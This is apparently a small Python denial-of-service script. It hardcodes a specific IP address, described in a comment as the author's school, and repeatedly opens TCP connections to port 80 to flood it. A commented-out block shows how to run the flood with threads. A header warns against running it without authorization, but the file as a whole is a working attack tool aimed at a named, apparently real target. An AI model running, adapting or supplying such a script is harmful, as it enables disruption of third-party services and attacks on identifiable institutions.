# WARNING: DO NOT run this script on any ip addresses/companies without any authorization. Serious actions can be taken
# against you such as being jailed, lawsuits or Fines.


import socket
import subprocess
# import threading


def restart_program():
    subprocess.call(['python', 'DDoS.py'])


print("DDoS mode loaded")
target = "76.10.203.122"                              # Don't Try To Boot This It Isn't My IP It's My School's IP
port = 80                                           # Attacking HTTP
conn = 10000
print("[Ip is locked]")
print("[Attacking " + target + "]")
message = "+---------------------------+"


def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((target, port))
        ddos.sendto(str.encode(message), (target, port))
    except socket.error:
        print("|[Connection Failed] |")
    print("|[DDoS Attack Engaged] |")               # Comment this out if needed since it slows down the py script.
    ddos.close()


for i in range(1, conn):
    dos()

# for i in range(500):                              # Use this to use multiple threading
#     thread = threading.thread(target=dos)
#     thread.start()

print("The connections you requested had finished")
